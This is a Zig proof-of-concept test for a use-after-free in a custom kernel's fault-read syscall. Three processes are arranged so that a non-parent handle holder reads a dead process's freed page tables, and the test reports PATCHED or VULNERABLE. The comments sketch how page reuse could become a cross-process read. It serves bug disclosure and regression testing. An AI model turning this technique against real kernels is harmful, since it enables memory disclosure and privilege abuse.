// CHILD: fault_readmem_dead_target_uaf_child.zig
//
// PoC for sysFaultReadMem / sysFaultWriteMem UAF: kernel does not reject
// the syscall when the target process is dead but still has a `.process`
// (not `.dead_process`) entry in the caller's perm table.
//
// Bug surface
// -----------
// kernel/syscall/fault.zig:459 (sysFaultReadMem) does the obvious caller
// validation but never checks whether the target is still alive:
//
//   const entry = proc.getPermByHandle(proc_handle) orelse return E_BADCAP;
//   if (entry.object != .process) return E_BADCAP;
//   if (!entry.processHandleRights().fault_handler) return E_PERM;
//   ...
//   const target = entry.object.process.lock(@src()) catch return E_BADCAP;
//   ...
//   target.vmm.demandPage(...) catch {};
//   const src_paddr = arch.paging.resolveVaddr(target.addr_space_root, ...)
//                       orelse return E_BADADDR;
//   const src_phys = VAddr.fromPAddr(src_paddr, null).addr + page_offset;
//   @memcpy(dst[0..chunk], src[0..chunk]);
//
// `entry.object != .process` is the only liveness gate. It is updated only
// when *some* code path calls `convertToDeadProcess(holder, target)`.
// Today that conversion fires from exactly two places:
//
//   * `Process.cleanupPhase2` and `Process.doExit` (zombie path) →
//     converts entries in the dying process's PARENT only.
//   * `sysIpcSend` / `sysIpcCall` lazy detection → converts entries in
//     the SENDER only, on the next IPC attempt to a dead target.
//
// Any other holder of a process handle to T — e.g. a process that
// received it via cap transfer from T's parent — keeps its `.process`
// entry indefinitely after T dies. Meanwhile `cleanupPhase1` has run
// `arch.paging.freeUserAddrSpace(self.addr_space_root)` (process.zig:1379),
// freeing every L3/L2/L1 page of T's user half back to the PMM (and
// zeroing them — pmm.freePage zeroes-on-free for a clean alloc invariant).
// `addr_space_root` itself, however, is *not* zeroed and the L4 entries
// 0–255 are *not* cleared by `freeUserAddrSpace`. The L4 root page is
// likewise still allocated (the slab slot is preserved as a `dead_process`
// tombstone per process.zig:1410).
//
// So a non-parent holder calling `sysFaultReadMem(t_handle, va, …)` after
// T's death:
//   1. passes the `.process` check (no one ever converted *its* entry);
//   2. passes `processHandleRights().fault_handler`;
//   3. `entry.object.process.lock()` succeeds (slot still live);
//   4. `target.vmm.demandPage()` returns NoMapping (deinit set count=0)
//      and is silently ignored;
//   5. `arch.paging.resolveVaddr(target.addr_space_root, va)` walks the
//      stale L4 entry into a freed (and zeroed) L3 page → present=0 →
//      returns null → syscall returns E_BADADDR.
//
// The smoking gun is step 5: a patched kernel must return E_BADCAP at
// step 1/3 because the target is dead. Returning E_BADADDR proves the
// syscall walked into a freed-and-recycled physical page. With careful
// PMM-reuse engineering (LIFO per-core cache: T's freed L3 paddr is the
// next 4 KiB allocation from the same core), the freed L3 paddr can be
// reused as another process's L3 table, in which case the same walk
// returns a non-null leaf paddr from the new owner — a cross-process
// arbitrary read primitive. The reuse engineering is fragile under SMP;
// this PoC sticks to the deterministic E_BADADDR vs E_BADCAP differential.
//
// Topology
// --------
// Three processes:
//   * poc       — root_service. Spawns T and A. Drives the sequence.
//                 Holds a process handle to T (from proc_create) and to A.
//                 *Will* have its T entry converted to .dead_process by
//                 the parent path, so poc itself can't observe the bug.
//   * T         — first child. Reserves the secret VA, replies with
//                 HANDLE_SELF + fault_handler so poc becomes T's fault
//                 handler. Receives a kill ping from poc, replies, exits.
//   * A         — second child. Receives T's process handle (with the
//                 fault_handler bit) via cap transfer from poc. A is *not*
//                 T's parent, so T's death does not convert A's entry.
//                 After T is dead, A calls sysFaultReadMem on T and
//                 reports the return code + 8 bytes back to poc.
//
// The PoC waits for poc's own `.process` entry to T to flip to
// `.dead_process` (observable in poc's perm_view) before asking A to
// perform the read — this is the synchronization point that proves T's
// cleanup has completed.

const lib = @import("lib");

const perms = lib.perms;
const perm_view = lib.perm_view;
const syscall = lib.syscall;
const t = lib.testing;

const child_elf = @embedFile("zig-out/bin/child");

const ROLE_T_INIT: u64 = 1;
const ROLE_T_DIE: u64 = 2;
const ROLE_A_INIT: u64 = 3;
const ROLE_A_DO_READ: u64 = 4;

const E_OK: i64 = 0;
const E_PERM: i64 = -2;
const E_BADCAP: i64 = -3;
const E_BADADDR: i64 = -7;

const SECRET_VA: u64 = 0x100_0000_0000;
const SECRET_VAL: u64 = 0xDEADBEEF_CAFEBABE;

fn fail(label: []const u8, val: i64) noreturn {
    syscall.write("POC-fault-readmem-dead-target: SETUP_FAIL ");
    syscall.write(label);
    syscall.write(" rc=");
    t.printI64(val);
    syscall.write("\n");
    syscall.shutdown();
}

pub fn main(pv: u64) void {
    const view: [*]const perm_view.UserViewEntry = @ptrFromInt(pv);

    // -------- Spawn T --------
    // T needs `.fault_handler` in slot 0 so it can grant the bit via the
    // HANDLE_SELF cap transfer that follows. mem_reserve + spawn_thread
    // are the minimum to set up the secret page and run main.
    const t_self_rights = (perms.ProcessRights{
        .spawn_thread = true,
        .mem_reserve = true,
        .fault_handler = true,
    }).bits();
    const t_handle_signed = syscall.proc_create(
        @intFromPtr(child_elf.ptr),
        child_elf.len,
        t_self_rights,
    );
    if (t_handle_signed < 0) fail("spawn T", t_handle_signed);
    const t_handle: u64 = @bitCast(t_handle_signed);

    // -------- ROLE_T_INIT: hand T its job --------
    // T mem_reserves, writes the secret, then ipc_reply_caps with
    // HANDLE_SELF + fault_handler so:
    //   * T.fault_handler_proc = poc
    //   * poc's existing T process-handle entry gets the fault_handler
    //     bit OR'd in (per ipc.zig:156-167; no new entry inserted).
    var reply: syscall.IpcMessage = .{};
    var rc = syscall.ipc_call(t_handle, &.{ROLE_T_INIT}, &reply);
    if (rc != E_OK) fail("ipc_call T (INIT)", rc);

    // -------- Spawn A --------
    // A only needs spawn_thread for its main; it receives the T handle
    // (with fault_handler) via cap transfer from us below. Crucially,
    // A is NOT T's parent — that asymmetry is the entire bug.
    const a_self_rights = (perms.ProcessRights{
        .spawn_thread = true,
    }).bits();
    const a_handle_signed = syscall.proc_create(
        @intFromPtr(child_elf.ptr),
        child_elf.len,
        a_self_rights,
    );
    if (a_handle_signed < 0) fail("spawn A", a_handle_signed);
    const a_handle: u64 = @bitCast(a_handle_signed);

    // -------- ROLE_A_INIT + cap transfer of T to A --------
    // Last 2 words = (handle, rights) per the kernel's getCapPayload.
    // grant rights came with proc_create; fault_handler came from T's
    // HANDLE_SELF transfer above; both are present in our T entry so the
    // isSubset check in transferCapability passes.
    const transfer_rights: u64 = (perms.ProcessHandleRights{
        .send_words = true,
        .fault_handler = true,
    }).bits();
    rc = syscall.ipc_call_cap(
        a_handle,
        &.{ ROLE_A_INIT, t_handle, transfer_rights },
        &reply,
    );
    if (rc != E_OK) fail("ipc_call_cap A (INIT)", rc);
    if (reply.words[0] == 0) fail("A did not recover T handle", 0);

    // -------- ROLE_T_DIE: ask T to thread_exit --------
    // T replies (waking us) and immediately calls thread_exit. T is
    // single-threaded → process exits → cleanupPhase1 frees the user
    // address space → cleanupPhase2 (T is leaf) calls
    // poc.convertToDeadProcess(T) which flips OUR perm entry to
    // .dead_process.
    rc = syscall.ipc_call(t_handle, &.{ROLE_T_DIE}, &reply);
    if (rc != E_OK) fail("ipc_call T (DIE)", rc);

    // Synchronize on T's death by polling our own perm_view for the
    // .process → .dead_process transition. This is the deterministic
    // signal that cleanupPhase2 has run (and therefore cleanupPhase1's
    // freeUserAddrSpace has run too).
    while (true) {
        var dead = false;
        for (0..128) |i| {
            if (view[i].handle == t_handle and
                view[i].entry_type == perm_view.ENTRY_TYPE_DEAD_PROCESS)
            {
                dead = true;
                break;
            }
        }
        if (dead) break;
        _ = syscall.thread_yield();
    }

    // -------- ROLE_A_DO_READ: trigger the buggy syscall --------
    // A holds a still-.process entry to T even though T's address space
    // has been freed. A invokes sysFaultReadMem(T, SECRET_VA, …).
    rc = syscall.ipc_call(a_handle, &.{ROLE_A_DO_READ}, &reply);
    if (rc != E_OK) fail("ipc_call A (DO_READ)", rc);

    const a_rc: i64 = @bitCast(reply.words[0]);
    const a_value: u64 = reply.words[1];

    syscall.write("POC-fault-readmem-dead-target: A.fault_read_mem rc=");
    t.printI64(a_rc);
    syscall.write(" value=0x");
    t.printHex(a_value);
    syscall.write("\n");

    if (a_rc == E_BADCAP) {
        syscall.write("POC-fault-readmem-dead-target: PATCHED (A's entry flipped to dead_process or syscall checks target.alive)\n");
    } else if (a_rc == E_BADADDR or a_rc == E_OK or a_rc == E_PERM) {
        syscall.write("POC-fault-readmem-dead-target: VULNERABLE (syscall walked freed page tables on a dead target; a_rc != E_BADCAP)\n");
    } else {
        syscall.write("POC-fault-readmem-dead-target: UNEXPECTED rc — investigate\n");
    }

    syscall.shutdown();
}
